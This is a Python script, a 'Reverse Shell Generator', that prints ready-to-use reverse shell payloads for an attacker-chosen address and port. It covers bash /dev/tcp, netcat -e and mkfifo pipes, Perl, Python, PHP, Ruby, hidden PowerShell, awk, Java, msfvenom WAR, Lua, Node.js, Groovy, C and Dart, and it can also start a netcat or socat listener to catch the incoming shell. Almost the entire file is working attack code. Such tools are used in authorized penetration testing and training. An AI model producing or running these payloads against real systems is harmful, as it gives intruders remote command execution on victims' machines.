#!/usr/bin/python3
"""
Date      : 2021.06.03
Developer : Erusha Sandushan
"""
from os import *
from colorama import Fore
from optparse import OptionParser
import sys

intro ="""
###############################################################################
#                                                                             #  
#                                                                             #  
#                                                                             #  
#                           REVERSE SHELL GENERATOR                           #      
#                               BY ERUSHA SANDUSHAN                           #
#                                                                             #          
#                                                                             #
#                                                                             #  
#                                                                             #  
############################################################################### 
"""

parser = OptionParser()
parser.add_option("-a","--address",dest="address",help="The listen address")
parser.add_option("-p","--port",dest="port",help="The listen port")
parser.add_option("--payload",dest="payload",help="payload type")
parser.add_option("--listen",dest="listen",help="Listen for incoming Connections(need superuser permission)",action="store_true",default=False)
parser.add_option("--list",dest="p_list",help="list all available payloads",action="store_true",default=False)
(options, args) = parser.parse_args()

address = options.address
port = options.port
payload = options.payload
listen = options.listen
p_list = options.p_list


list = ["bash", "socat", "perl", "python", "php", "ruby", "golang", "netcat", "ncat", "openssl", "powershell", "awk",
        "java", "war", "lua", "nodejs", "groovy", "c", "dart"]

rev_shells = [
    f"""
Bash TCP:

    bash -i >& /dev/tcp/{address}/{port} 0>&1

    0<&196;exec 196<>/dev/tcp/{address}/{port}; sh <&196 >&196 2>&196

    /bin/bash -l > /dev/tcp/{address}/{port} 0<&1 2>&1

Bash UDP:

    sh -i >& /dev/udp/{address}/{port} 0>&1
""",
    f"""
Socat:

    user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{address}:{port}

""",
    f"""
Perl:

    perl -e 'use Socket;$i="{address}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'

    perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{address}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


Perl Windows:

    perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"{address}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

""",
    f"""
 Python:

    Linux only:

        export RHOST="{address}";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

        python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{address}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'


    Windows only:


        C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('{address}', {port})), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])}})(), type('try', (), {{'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]}})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({{}}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"

""",
    f"""
PHP:

    php -r '$sock=fsockopen("{address}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'

    php -r '$sock=fsockopen("{address}",{port});shell_exec("/bin/sh -i <&3 >&3 2>&3");'

    php -r '$sock=fsockopen("{address}",{port});`/bin/sh -i <&3 >&3 2>&3`;'

    php -r '$sock=fsockopen("{address}",{port});system("/bin/sh -i <&3 >&3 2>&3");'

    php -r '$sock=fsockopen("{address}",{port});passthru("/bin/sh -i <&3 >&3 2>&3");'

    php -r '$sock=fsockopen("{address}",{port});popen("/bin/sh -i <&3 >&3 2>&3", "r");'

    php -r '$sock=fsockopen("{address}",{port});$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

""",
    f"""
Ruby:

    ruby -rsocket -e'f=TCPSocket.open("{address}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

    ruby -rsocket -e'exit if fork;c=TCPSocket.new("{address}","{port}");loop{{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts "failed: #{{$_}}"}}'

Windows only:

    ruby -rsocket -e 'c=TCPSocket.new("{address}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end'

""",
    f"""

Golang:

    echo 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{address}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

""",
    f"""
Netcat Traditional:

    nc -e /bin/sh {address} {port}
    nc -e /bin/bash {address} {port}
    nc -c bash {address} {port}

Netcat OpenBsd:

    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {address} {port} >/tmp/f

Netcat BusyBox:

    rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {address} {port} >/tmp/f
""",
    f"""
Ncat:

    ncat {address} {port} -e /bin/bash

    ncat --udp {address} {port} -e /bin/bash

""",
    f"""
OpenSSL:

user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {address}:{port} > /tmp/s; rm /tmp/s

""",
    f"""

Powershell:

    powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{address}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()

    powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{address}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"

""",
    f"""
Awk:

    awk 'BEGIN {{s = "/inet/tcp/0/{address}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}}' /dev/null

""",
    f"""
Java:

    Runtime r = Runtime.getRuntime();
    Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/{address}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done'");
    p.waitFor();

""",
    f"""
War:

    msfvenom -p java/jsp_shell_reverse_tcp LHOST={address} LPORT={port} -f war > reverse.war
    strings reverse.war | grep jsp 

""",
    f"""
Lua:

    Linux only

        lua -e "require('socket');require('os');t=socket.tcp();t:connect('{address}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');"

    Windows and Linux:

        lua5.1 -e 'local host, port = "{address}", {port} local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

""",
    f"""
NodeJS:


    (function(){{
        var net = require("net"),
            cp = require("child_process"),
            sh = cp.spawn("/bin/sh", []);
        var client = new net.Socket();
        client.connect({port}, "{address}", function(){{
            client.pipe(sh.stdin);
            sh.stdout.pipe(client);
            sh.stderr.pipe(client);
        }});
        return /a/; // Prevents the Node.js application form crashing
    }})();


or

    require('child_process').exec('nc -e /bin/sh {address} {port}')

or

    -var x = global.process.mainModule.require
    -x('child_process').exec('nc {address} {port} -e /bin/bash')

""",
    f"""

Groovy:

    String host="{address}";
    int port={port};
    String cmd="cmd.exe";
    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}};p.destroy();s.close();

""",
    f"""

C:

    Compile with `gcc /tmp/shell.c --output csh && csh`


#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){{
    int port = {port};
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("{address}");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {{"/bin/sh", NULL}};
    execve("/bin/sh", argv, NULL);

    return 0;       
}}
""",
    f"""
Dart:

    import 'dart:io';
    import 'dart:convert';

    main() {{
      Socket.connect("{address}", {port}).then((socket) {{
        socket.listen((data) {{
          Process.start('powershell.exe', []).then((Process process) {{
            process.stdin.writeln(new String.fromCharCodes(data).trim());
            process.stdout
              .transform(utf8.decoder)
              .listen((output) {{ socket.write(output); }});
          }});
        }},
        onDone: () {{
          socket.destroy();
        }});
      }});
    }}

"""]


def NC(port,payload):
    if payload == 'socat':
        system(f'socat file:`tty`,raw,echo=0 TCP-L:{port}')
    elif payload == 'openssl':
        system(f'ncat --ssl -vv -l -p {port}')
    else:
        system(f'sudo nc -nvlp {port}')

def SelectPayload(payload):
    if payload == 'bash':
        print(rev_shells[0])
         
    elif payload == 'socat':
        print(rev_shells[1])
         
    elif payload == 'perl':
        print(rev_shells[2])
         
    elif payload == 'python':
        print(rev_shells[3])
         
    elif payload == 'php':
        print(rev_shells[4])
         
    elif payload == 'ruby':
        print(rev_shells[5])
         
    elif payload == 'golang':
        print(rev_shells[6])
         
    elif payload == 'netcat':
        print(rev_shells[7])
         
    elif payload == 'ncat':
        print(rev_shells[8])
         
    elif payload == 'openssl':
        print(rev_shells[9])
         
    elif payload == 'powershell':
        print(rev_shells[10])
         
    elif payload == 'awk':
        print(rev_shells[11])
         
    elif payload == 'java':
        print(rev_shells[12])
         
    elif payload == 'war':
        print(rev_shells[13])
         
    elif payload == 'lua':
        print(rev_shells[14])
         
    elif payload == 'nodejs':
        print(rev_shells[15])
         
    elif payload == 'groovy':
        print(rev_shells[16])
         
    elif payload == 'c':
        print(rev_shells[17])
         
    elif payload == 'dart':
        print(rev_shells[18])
         

payload_list = """ 
             *********************************************************************
             *      bash      |      socat      |      perl     |     nodejs     *  
             *********************************************************************
             *      python    |      php        |      ruby     |        c       *
             *********************************************************************
             *      golang    |      netcat     |      ncat     |     groovy     *
             *********************************************************************
             *      openssl   |    powershell   |      awk      |      dart      * 
             *********************************************************************
             *      java      |      war        |      lua      |       --       *
             *********************************************************************                
"""


def validator(port,payload):
    if not payload in list:
        print("\n   [-] Invalid payload")
        print("   [+] Get Payload List using " + Fore.BLUE+"reverseshellgenerator --list "+Fore.RESET)
    int(port)


if __name__ == "__main__":
    try:
        if options.p_list:
            print(payload_list)
        elif not any((options.port,options.address,options.payload)):
            print(intro)
            parser.print_help()
        else:
            validator(port,payload)
            SelectPayload(payload)
            if listen:
                NC(port,payload)
    except KeyboardInterrupt:
        print('[+]  Exiting.. ')
        sys.exit()
    except ValueError:
        print("The PORT only contain numbers only")
        sys.exit()